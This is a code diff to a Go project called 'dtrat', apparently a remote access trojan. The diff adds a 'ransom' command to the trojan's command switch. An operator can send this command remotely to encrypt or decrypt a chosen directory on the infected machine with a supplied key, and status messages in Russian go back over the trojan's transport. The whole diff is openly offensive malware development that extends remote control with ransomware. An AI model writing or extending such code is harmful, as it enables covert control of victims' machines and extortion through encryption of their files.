@@ -4,6 +4,7 @@ import (
 	"context"
 	"dtrat/config"
 	"dtrat/engine/system/usb"
+	"dtrat/spy/ransom"
 	"dtrat/transport"
 	"fmt"
 	"os"
@@ -62,6 +63,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.infoCmd()
 	case "show":
 		go r.showCmd(args)
+	case "ransom":
+		go r.ransomCmd(args)
 	default:
 		go r.defaultCmd()
 	}
@@ -382,5 +385,60 @@ func (r *Rat) showCmd(args string) {
 	if err != nil {
 		r.Transport.Send("Ошибка: %v", err)
 		return
+	}
+}
+
+func (r *Rat) ransomCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
+	mode, args := transport.ParseCommand(args)
+	if mode != "encrypt" && mode != "decrypt" {
+		r.Transport.Send("Используйте /ransom [encrypt|decrypt] PATH KEY [EXCLUDES]")
+		return
+	}
+
+	path, args := transport.ParseCommand(args)
+	if path == "" {
+		r.Transport.Send("Пожалуйста, укажите путь к директории.")
+		return
+	}
+
+	key, args := transport.ParseCommand(args)
+	if key == "" {
+		r.Transport.Send("Пожалуйста, укажите ключ шифрования.")
+		return
+	}
+
+	excludes := args // Может быть пустой строкой, что означает отсутствие исключений
+	if excludes == "" {
+		excludes = ransom.DefaultExcludes
+	}
+
+	rns, err := ransom.NewRansom(path, key, excludes)
+	if err != nil {
+		r.Transport.Send("Ошибка инициализации шифровальщика: %v", err)
+		return
+	}
+	defer rns.Stop()
+
+	switch mode {
+	case "encrypt":
+		r.Transport.Send("Начало шифрования директории %s...", path)
+		err = rns.Encrypt()
+		if err != nil {
+			r.Transport.Send("Ошибка шифрования: %v", err)
+			return
+		}
+		r.Transport.Send("Директория %s успешно зашифрована!", path)
+	case "decrypt":
+		r.Transport.Send("Начало расшифрования директории %s...", path)
+		err = rns.Decrypt()
+		if err != nil {
+			r.Transport.Send("Ошибка расшифрования: %v", err)
+			return
+		}
+		r.Transport.Send("Директория %s успешно расшифрована!", path)
 	}
 }
